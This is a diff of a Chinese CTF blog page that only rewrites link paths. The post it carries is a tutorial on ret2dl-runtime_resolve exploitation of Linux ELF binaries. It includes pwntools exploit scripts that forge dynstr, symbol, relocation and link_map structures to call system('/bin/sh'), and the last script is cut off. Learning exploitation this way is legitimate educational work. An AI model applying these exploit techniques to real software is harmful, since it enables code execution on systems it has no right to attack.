@@ -5,55 +5,55 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
 <meta name="theme-color" content="#222">
 <meta name="generator" content="Hexo 7.3.0">
-  <link rel="apple-touch-icon" sizes="180x180" href="/ha1vk/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/ha1vk/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/ha1vk/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/ha1vk/images/logo.svg" color="#222">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
 
-<link rel="stylesheet" href="/ha1vk/css/main.css">
+<link rel="stylesheet" href="/css/main.css">
 
 
-<link rel="stylesheet" href="/ha1vk/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
 
 <script id="hexo-configurations">
     var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"github.com","root":"/ha1vk/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+    var CONFIG = {"hostname":"github.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
   </script>
 
   <meta name="description" content="在linux下，二进制引用的外部符号加载方式有三种，FULL_RELRO、PARTIAL_RELRO、NO_RELRO，在PARTIAL_RELRO和NO_RELRO的情况下，外部符号的地址延迟加载，并且，在NO_RELRO下，ELF的dynamic段可读写。 ELF有plt表和got表，程序调用外部函数函数时，call的是plt表项，而plt表中，是这样的   plt表里，取出了got表对应函数">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ret2dl-runtime_resolve学习">
-<meta property="og:url" content="https://github.com/ha1vk/2020/02/24/ret2dl-runtime_resolve/index.html">
+<meta property="og:url" content="https://github.com/2020/02/24/ret2dl-runtime_resolve/index.html">
 <meta property="og:site_name" content="ha1vk&#39;s blog">
 <meta property="og:description" content="在linux下，二进制引用的外部符号加载方式有三种，FULL_RELRO、PARTIAL_RELRO、NO_RELRO，在PARTIAL_RELRO和NO_RELRO的情况下，外部符号的地址延迟加载，并且，在NO_RELRO下，ELF的dynamic段可读写。 ELF有plt表和got表，程序调用外部函数函数时，call的是plt表项，而plt表中，是这样的   plt表里，取出了got表对应函数">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://github.com/ha1vk/2020/02/24/ret2dl-runtime_resolve/image1.JPG">
-<meta property="og:image" content="https://github.com/ha1vk/2020/02/24/ret2dl-runtime_resolve/image2.JPG">
-<meta property="og:image" content="https://github.com/ha1vk/2020/02/24/ret2dl-runtime_resolve/image3.JPG">
-<meta property="og:image" content="https://github.com/ha1vk/2020/02/24/ret2dl-runtime_resolve/image4.JPG">
-<meta property="og:image" content="https://github.com/ha1vk/2020/02/24/ret2dl-runtime_resolve/image5.JPG">
-<meta property="og:image" content="https://github.com/ha1vk/2020/02/24/ret2dl-runtime_resolve/image6.JPG">
-<meta property="og:image" content="https://github.com/ha1vk/2020/02/24/ret2dl-runtime_resolve/image7.JPG">
-<meta property="og:image" content="https://github.com/ha1vk/2020/02/24/ret2dl-runtime_resolve/image8.JPG">
-<meta property="og:image" content="https://github.com/ha1vk/2020/02/24/ret2dl-runtime_resolve/image9.JPG">
-<meta property="og:image" content="https://github.com/ha1vk/2020/02/24/ret2dl-runtime_resolve/image10.JPG">
-<meta property="og:image" content="https://github.com/ha1vk/2020/02/24/ret2dl-runtime_resolve/image11.JPG">
-<meta property="og:image" content="https://github.com/ha1vk/2020/02/24/ret2dl-runtime_resolve/image12.JPG">
-<meta property="og:image" content="https://github.com/ha1vk/2020/02/24/ret2dl-runtime_resolve/image13.JPG">
-<meta property="og:image" content="https://github.com/ha1vk/2020/02/24/ret2dl-runtime_resolve/image14.JPG">
-<meta property="og:image" content="https://github.com/ha1vk/2020/02/24/ret2dl-runtime_resolve/image15.JPG">
-<meta property="og:image" content="https://github.com/ha1vk/2020/02/24/ret2dl-runtime_resolve/image16.JPG">
-<meta property="og:image" content="https://github.com/ha1vk/2020/02/24/ret2dl-runtime_resolve/image17.JPG">
-<meta property="og:image" content="https://github.com/ha1vk/2020/02/24/ret2dl-runtime_resolve/image18.JPG">
+<meta property="og:image" content="https://github.com/2020/02/24/ret2dl-runtime_resolve/image1.JPG">
+<meta property="og:image" content="https://github.com/2020/02/24/ret2dl-runtime_resolve/image2.JPG">
+<meta property="og:image" content="https://github.com/2020/02/24/ret2dl-runtime_resolve/image3.JPG">
+<meta property="og:image" content="https://github.com/2020/02/24/ret2dl-runtime_resolve/image4.JPG">
+<meta property="og:image" content="https://github.com/2020/02/24/ret2dl-runtime_resolve/image5.JPG">
+<meta property="og:image" content="https://github.com/2020/02/24/ret2dl-runtime_resolve/image6.JPG">
+<meta property="og:image" content="https://github.com/2020/02/24/ret2dl-runtime_resolve/image7.JPG">
+<meta property="og:image" content="https://github.com/2020/02/24/ret2dl-runtime_resolve/image8.JPG">
+<meta property="og:image" content="https://github.com/2020/02/24/ret2dl-runtime_resolve/image9.JPG">
+<meta property="og:image" content="https://github.com/2020/02/24/ret2dl-runtime_resolve/image10.JPG">
+<meta property="og:image" content="https://github.com/2020/02/24/ret2dl-runtime_resolve/image11.JPG">
+<meta property="og:image" content="https://github.com/2020/02/24/ret2dl-runtime_resolve/image12.JPG">
+<meta property="og:image" content="https://github.com/2020/02/24/ret2dl-runtime_resolve/image13.JPG">
+<meta property="og:image" content="https://github.com/2020/02/24/ret2dl-runtime_resolve/image14.JPG">
+<meta property="og:image" content="https://github.com/2020/02/24/ret2dl-runtime_resolve/image15.JPG">
+<meta property="og:image" content="https://github.com/2020/02/24/ret2dl-runtime_resolve/image16.JPG">
+<meta property="og:image" content="https://github.com/2020/02/24/ret2dl-runtime_resolve/image17.JPG">
+<meta property="og:image" content="https://github.com/2020/02/24/ret2dl-runtime_resolve/image18.JPG">
 <meta property="article:published_time" content="2020-02-24T06:27:11.000Z">
 <meta property="article:modified_time" content="2025-06-25T08:18:34.622Z">
 <meta property="article:author" content="ha1vk">
 <meta property="article:tag" content="ROP">
 <meta property="article:tag" content="ret2dl">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://github.com/ha1vk/2020/02/24/ret2dl-runtime_resolve/image1.JPG">
+<meta name="twitter:image" content="https://github.com/2020/02/24/ret2dl-runtime_resolve/image1.JPG">
 
-<link rel="canonical" href="https://github.com/ha1vk/2020/02/24/ret2dl-runtime_resolve/">
+<link rel="canonical" href="https://github.com/2020/02/24/ret2dl-runtime_resolve/">
 
 
 <script id="page-configurations">
@@ -115,7 +115,7 @@
 
   <div class="site-meta">
 
-    <a href="/ha1vk/" class="brand" rel="start">
+    <a href="/" class="brand" rel="start">
       <span class="logo-line-before"><i></i></span>
       <h1 class="site-title">ha1vk's blog</h1>
       <span class="logo-line-after"><i></i></span>
@@ -136,27 +136,27 @@
   <ul id="menu" class="main-menu menu">
         <li class="menu-item menu-item-home">
 
-    <a href="/ha1vk/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
 
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/ha1vk/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
 
   </li>
         <li class="menu-item menu-item-categories">
 
-    <a href="/ha1vk/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
 
   </li>
         <li class="menu-item menu-item-tags">
 
-    <a href="/ha1vk/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
 
   </li>
         <li class="menu-item menu-item-about">
 
-    <a href="/ha1vk/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
 
   </li>
       <li class="menu-item menu-item-search">
@@ -214,10 +214,10 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2020/02/24/ret2dl-runtime_resolve/">
+    <link itemprop="mainEntityOfPage" href="https://github.com/2020/02/24/ret2dl-runtime_resolve/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="image" content="/images/avatar.gif">
       <meta itemprop="name" content="ha1vk">
       <meta itemprop="description" content="">
     </span>
@@ -252,7 +252,7 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                 </span>
             </span>
 
@@ -276,26 +276,26 @@
       
         <p>在linux下，二进制引用的外部符号加载方式有三种，FULL_RELRO、PARTIAL_RELRO、NO_RELRO，在PARTIAL_RELRO和NO_RELRO的情况下，外部符号的地址延迟加载，并且，在NO_RELRO下，ELF的dynamic段可读写。</p>
 <p>ELF有plt表和got表，程序调用外部函数函数时，call的是plt表项，而plt表中，是这样的</p>
-<img src="/ha1vk/2020/02/24/ret2dl-runtime_resolve/image1.JPG" class="">
+<img src="/2020/02/24/ret2dl-runtime_resolve/image1.JPG" class="">
 
 <p>plt表里，取出了got表对应函数的地址，然后jmp到地址处。</p>
 <p>我们看看got表是什么样子的</p>
-<img src="/ha1vk/2020/02/24/ret2dl-runtime_resolve/image2.JPG" class="">
+<img src="/2020/02/24/ret2dl-runtime_resolve/image2.JPG" class="">
 
 <p>并**[没有指向read函数]{.mark}**，我们跟踪过去看看</p>
-<img src="/ha1vk/2020/02/24/ret2dl-runtime_resolve/image3.JPG" class="">
+<img src="/2020/02/24/ret2dl-runtime_resolve/image3.JPG" class="">
 
 <p>Push了一个数字，然后又jmp到了plt0处</p>
-<img src="/ha1vk/2020/02/24/ret2dl-runtime_resolve/image4.JPG" class="">
+<img src="/2020/02/24/ret2dl-runtime_resolve/image4.JPG" class="">
 
 <p>最终发现，先push了一个地址，然后跳到了第二个划线地址处</p>
-<img src="/ha1vk/2020/02/24/ret2dl-runtime_resolve/image5.JPG" class="">
+<img src="/2020/02/24/ret2dl-runtime_resolve/image5.JPG" class="">
 
 <p>跟踪进去看看</p>
-<img src="/ha1vk/2020/02/24/ret2dl-runtime_resolve/image6.JPG" class="">
+<img src="/2020/02/24/ret2dl-runtime_resolve/image6.JPG" class="">
 
 <p>其实这就是dl_runtime_resolve函数，我们运行完后，再观察got表</p>
-<img src="/ha1vk/2020/02/24/ret2dl-runtime_resolve/image7.JPG" class="">
+<img src="/2020/02/24/ret2dl-runtime_resolve/image7.JPG" class="">
 
 <p>其实就是dl_runtime_resolve接受两个参数，第一个是link_map，通过这个link_map，ld链接器可以访问到dynstr、dynamic、dynsym、rel.plt等所需要的数据地址，而第二个参数，则表明要解析的函数在符号表中是第几个，比如，在这个elf文件里，我们的read在第三个位置，因此push 2</p>
 <p>那么，dl_runtime_resolve是如何工作的呢？我们查看glibc的源码，看看</p>
@@ -312,9 +312,9 @@
 
 <p>在NO_RELRO情况下，因为dynamic可以修改，因此，我们直接修改dynamic的strtab，将它指向我们可控的区域，然后在可控区域对应的位置布置下需要的函数的名字即可，即伪造</p>
 <p>dynstr。要注意对齐。</p>
-<img src="/ha1vk/2020/02/24/ret2dl-runtime_resolve/image8.JPG" class="">
+<img src="/2020/02/24/ret2dl-runtime_resolve/image8.JPG" class="">
 
-<img src="/ha1vk/2020/02/24/ret2dl-runtime_resolve/image9.JPG" class="">
+<img src="/2020/02/24/ret2dl-runtime_resolve/image9.JPG" class="">
 
 <p>我们利用read，在bss段布下假的dynstr，然后修改dynamic段里strtab地址，让它指向fake_dynstr，然后手动调用dl_runtime_resolve函数解析，即可得到我们需要的函数。</p>
 <p>我们的exp脚本如下</p>
@@ -327,10 +327,10 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8  </span></span><br><span class="line"><span class="comment">#关键是要解决堆栈平衡，不然system不会成功，因此，我们在第一次read时就事先把rop给输入进去了  </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">sh = process(<span class="string">&#x27;./ret2dlsolve2_64&#x27;</span>)  </span><br><span class="line">elf = ELF(<span class="string">&#x27;./ret2dlsolve2_64&#x27;</span>)  </span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]  </span><br><span class="line">fun_addr = elf.sym[<span class="string">&#x27;fun&#x27;</span>]  </span><br><span class="line"><span class="comment">#我们攻击的目标，我们要在此处修改指向fake_dynstr  </span></span><br><span class="line">target_addr = <span class="number">0x600768</span> + <span class="number">8</span>  </span><br><span class="line"><span class="comment">#用于加载函数地址的函数，当我们伪造了dynstr后，再次调用即可加载我们需要的函数  </span></span><br><span class="line">plt0_load = <span class="number">0x4003B0</span>  </span><br><span class="line"><span class="comment">#pop rdi;ret;  </span></span><br><span class="line">pop_rdi = <span class="number">0x400553</span>  </span><br><span class="line"><span class="comment">#pop rsi ; pop r15 ; ret  </span></span><br><span class="line">pop_rsi = <span class="number">0x400551</span>  </span><br><span class="line"><span class="comment">#伪造dynstr  </span></span><br><span class="line">fake_dynstr = <span class="string">&#x27;\x00libc.so.6\x00system\x00&#x27;</span>  </span><br><span class="line">bss = <span class="number">0x6008F8</span>  </span><br><span class="line"><span class="comment">#第一次构造2个输入机会，分别输入伪造的字符串，伪造的字符串的地址，rop  </span></span><br><span class="line">rop = p64(pop_rdi) + p64(bss) + p64(plt0_load) + p64(<span class="number">0</span>)  </span><br><span class="line">payload = rop.ljust(<span class="number">0x28</span>,<span class="string">&#x27;\x00&#x27;</span>) + p64(pop_rdi) + p64(<span class="number">0</span>) + p64(pop_rsi) + p64(bss) + p64(<span class="number">0</span>) + p64(read_plt)  </span><br><span class="line">payload +=  p64(pop_rdi) + p64(<span class="number">0</span>) + p64(pop_rsi) + p64(target_addr) + p64(<span class="number">0</span>) + p64(read_plt)  </span><br><span class="line">payload += rop  </span><br><span class="line">sh.sendline(payload)  </span><br><span class="line"><span class="comment">#发送伪造的字符串  </span></span><br><span class="line">payload2 = <span class="string">&#x27;/bin/sh&#x27;</span>.ljust(<span class="number">0x10</span>,<span class="string">&#x27;\x00&#x27;</span>) + fake_dynstr  </span><br><span class="line">sleep(<span class="number">1</span>)  </span><br><span class="line">sh.sendline(payload2)  </span><br><span class="line">sleep(<span class="number">1</span>)  </span><br><span class="line"><span class="comment">#修改dynsym里的strtab为我们伪造的dynstr  </span></span><br><span class="line">sh.sendline(p64(bss + <span class="number">0x10</span>))  </span><br><span class="line">  </span><br><span class="line">sh.interactive()  </span><br></pre></td></tr></table></figure>
 
 <h2 id="接下来，我们看看PARTIAL-RELRO的情况"><a href="#接下来，我们看看PARTIAL-RELRO的情况" class="headerlink" title="接下来，我们看看PARTIAL_RELRO的情况"></a>接下来，我们看看PARTIAL_RELRO的情况</h2><p>在PARTIAL_RELRO情况下，dynamic不可写，因此不再像上面那样简单的利用，我们需要伪造rel.plt。回过来看看源码</p>
-<img src="/ha1vk/2020/02/24/ret2dl-runtime_resolve/image10.JPG" class="">
+<img src="/2020/02/24/ret2dl-runtime_resolve/image10.JPG" class="">
 
 <p>在获取reloc时未检查下标越界，而符号名又是通过sym-&gt;st_name取得</p>
-<img src="/ha1vk/2020/02/24/ret2dl-runtime_resolve/image11.JPG" class="">
+<img src="/2020/02/24/ret2dl-runtime_resolve/image11.JPG" class="">
 
 <p>因此，我们在可控范围内同时伪造rel.plt、sym和dynstr，那么就能完成利用</p>
 <p>我们先来看看32位情况下</p>
@@ -340,7 +340,7 @@
 <p>先是伪造sym</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>  </span></span><br><span class="line"><span class="class">&#123;</span>  </span><br><span class="line">  Elf32_Word    st_name; <span class="comment">//符号名相对.dynstr起始的偏移  </span></span><br><span class="line">  Elf32_Addr    st_value;  </span><br><span class="line">  Elf32_Word    st_size;  </span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_info; <span class="comment">//对于导入符号，值为0x12  </span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_other;  </span><br><span class="line">  Elf32_Section st_shndx;  </span><br><span class="line">&#125;Elf32_Sym;  </span><br></pre></td></tr></table></figure>
 
-<img src="/ha1vk/2020/02/24/ret2dl-runtime_resolve/image12.JPG" class="">
+<img src="/2020/02/24/ret2dl-runtime_resolve/image12.JPG" class="">
 
 <p>我们可以参照IDA调试里现有的来改</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#开始伪造dynsym  </span></span><br><span class="line">fake_dynsym = p32(system_str - dynstr_addr)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p8(<span class="number">0x12</span>)+p8(<span class="number">0</span>)+p16(<span class="number">0</span>)  </span><br></pre></td></tr></table></figure>
@@ -348,7 +348,7 @@
 <p>然后我们伪造rel.plt</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>  </span></span><br><span class="line"><span class="class">&#123;</span>  </span><br><span class="line">  Elf32_Addr    r_offset; <span class="comment">//指向GOT表的指针  </span></span><br><span class="line">  Elf32_Word    r_info;  </span><br><span class="line">  <span class="comment">//导入符号的信息，r_info = (index) &lt;&lt; 8 + 0x7  </span></span><br><span class="line">&#125; Elf32_Rel;  </span><br></pre></td></tr></table></figure>
 
-<img src="/ha1vk/2020/02/24/ret2dl-runtime_resolve/image13.JPG" class="">
+<img src="/2020/02/24/ret2dl-runtime_resolve/image13.JPG" class="">
 
 <p>同样可以参照IDA调试里现有的来改</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#开始伪造rel.plt  </span></span><br><span class="line">fake_rel = p32(read_got) + p32((((fake_dynsym_addr - dynsym_addr) / <span class="number">16</span>) &lt;&lt; <span class="number">8</span>) + <span class="number">0x7</span>)  </span><br></pre></td></tr></table></figure>
@@ -374,11 +374,11 @@
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>  </span></span><br><span class="line"><span class="class">&#123;</span>  </span><br><span class="line">  Elf64_Word    st_name;        <span class="comment">/* Symbol name (string tbl index) */</span>  </span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_info;        <span class="comment">/* Symbol type and binding */</span>  </span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_other;       <span class="comment">/* Symbol visibility */</span>  </span><br><span class="line">  Elf64_Section st_shndx;       <span class="comment">/* Section index */</span>  </span><br><span class="line">  Elf64_Addr    st_value;       <span class="comment">/* Symbol value */</span>  </span><br><span class="line">  Elf64_Xword   st_size;        <span class="comment">/* Symbol size */</span>  </span><br><span class="line">&#125; Elf64_Sym;  </span><br></pre></td></tr></table></figure>
 
 <p>如何让sym-&gt;st_value为已经解析的函数的地址？</p>
-<img src="/ha1vk/2020/02/24/ret2dl-runtime_resolve/image14.JPG" class="">
+<img src="/2020/02/24/ret2dl-runtime_resolve/image14.JPG" class="">
 
 <p><strong>[如果，我们把read_got – 0x8处开始当成sym，那么sym-&gt;st_value就是read的地址，并且sym-&gt;st_other正好也不为0，绕过了if，一举两得]{.mark}</strong></p>
 <p>为了伪造link_map，我们需要知道link_map的结构，在glibc&#x2F;include&#x2F;link.h文件里，link_map结构比较复杂，但是，我们只需伪造需要用到的数据即可。</p>
-<img src="/ha1vk/2020/02/24/ret2dl-runtime_resolve/image15.JPG" class="">
+<img src="/2020/02/24/ret2dl-runtime_resolve/image15.JPG" class="">
 
 <p>我们需要伪造这个数组里的几个指针，它们分别是</p>
 <p>DT_STRTAB指针：位于link_map_addr +0x68(32位下是0x34)</p>
@@ -394,15 +394,15 @@
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8  </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">  </span><br><span class="line">sh = process(<span class="string">&#x27;./ret2dlsolve_64&#x27;</span>)  </span><br><span class="line">elf = ELF(<span class="string">&#x27;./ret2dlsolve_64&#x27;</span>)  </span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.27.so&#x27;</span>)  </span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]  </span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]  </span><br><span class="line">fun_addr = elf.sym[<span class="string">&#x27;fun&#x27;</span>]  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#bss段  </span></span><br><span class="line">bss = <span class="number">0x601030</span>  </span><br><span class="line">  </span><br><span class="line">l_addr = libc.sym[<span class="string">&#x27;system&#x27;</span>] - libc.sym[<span class="string">&#x27;read&#x27;</span>]  </span><br><span class="line"><span class="comment">#注意，只要是可读写的内存地址即可，调试看看就知道了  </span></span><br><span class="line">r_offset = bss + l_addr * -<span class="number">1</span>  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#负数需要补码  </span></span><br><span class="line"><span class="keyword">if</span> l_addr &lt; <span class="number">0</span>:  </span><br><span class="line">   l_addr = l_addr + <span class="number">0x10000000000000000</span>  </span><br><span class="line">  </span><br><span class="line">pop_rdi = <span class="number">0x400583</span>  </span><br><span class="line"><span class="comment">#pop rsi ; pop r15 ; ret  </span></span><br><span class="line">pop_rsi = <span class="number">0x400581</span>  </span><br><span class="line"><span class="comment">#用于解析符号dl_runtime_resolve  </span></span><br><span class="line">plt_load = <span class="number">0x4003E6</span>  </span><br><span class="line">  </span><br><span class="line"><span class="comment">#第一次继续调用read输入伪造的数据结构，然后再一次调用fun来输入rop  </span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(pop_rsi) + p64(bss + <span class="number">0x100</span>) + p64(<span class="number">0</span>) + p64(pop_rdi) + p64(<span class="number">0</span>) + p64(read_plt) + p64(fun_addr)  </span><br><span class="line"><span class="comment">#raw_input()  </span></span><br><span class="line">sleep(<span class="number">1</span>)  </span><br><span class="line">sh.sendline(payload)  </span><br><span class="line"><span class="comment">#真正的dynstr的地址  </span></span><br><span class="line">dynstr = <span class="number">0x400318</span>  </span><br><span class="line"><span class="comment">#我们准备把link_map放置在bss+0x100处  </span></span><br><span class="line">fake_link_map_addr = bss + <span class="number">0x100</span>  </span><br><span class="line"><span class="comment">#假的dyn_strtab  </span></span><br><span class="line">fake_dyn_strtab_addr = fake_link_map_addr + <span class="number">0x8</span>  </span><br><span class="line">fake_dyn_strtab = p64(<span class="number">0</span>) + p64(dynstr) <span class="comment">#fake_link_map_addr + 0x8  </span></span><br><span class="line"><span class="comment">#假的dyn_symtab，我们要让对应的dynsym里的st_value指向一个已经解析过的函数的got表  </span></span><br><span class="line"><span class="comment">#其他字段无关紧要，所以，我们让dynsym为read_got - 0x8，这样，相当于把read_got - 0x8处开始当做一个dynsym，这样st_value正好对应了read的地址  </span></span><br><span class="line"><span class="comment">#并且(*(sym+5))&amp;0x03 != 0也成立  </span></span><br><span class="line">fake_dyn_symtab_addr = fake_link_map_addr + <span class="number">0x18</span>  </span><br><span class="line">fake_dyn_symtab = p64(<span class="number">0</span>) + p64(read_got - <span class="number">0x8</span>) <span class="comment">#fake_link_map_addr + 0x18  </span></span><br><span class="line"><span class="comment">#假的dyn_rel  </span></span><br><span class="line">fake_dyn_rel_addr = fake_link_map_addr + <span class="number">0x28</span>  </span><br><span class="line">fake_dyn_rel = p64(<span class="number">0</span>) + p64(fake_link_map_addr + <span class="number">0x38</span>) <span class="comment">#fake_link_map_addr + 0x28  </span></span><br><span class="line"><span class="comment">#假的rel.plt  </span></span><br><span class="line">fake_rel = p64(r_offset) + p64(<span class="number">0x7</span>) + p64(<span class="number">0</span>) <span class="comment">#fake_link_map_addr + 0x38  </span></span><br><span class="line"><span class="comment">#l_addr  </span></span><br><span class="line">fake_link_map = p64(l_addr)  </span><br><span class="line"><span class="comment">#由于link_map的中间部分在我们的攻击中无关紧要，所以我们把伪造的几个数据结构也放当中  </span></span><br><span class="line">fake_link_map += fake_dyn_strtab  </span><br><span class="line">fake_link_map += fake_dyn_symtab  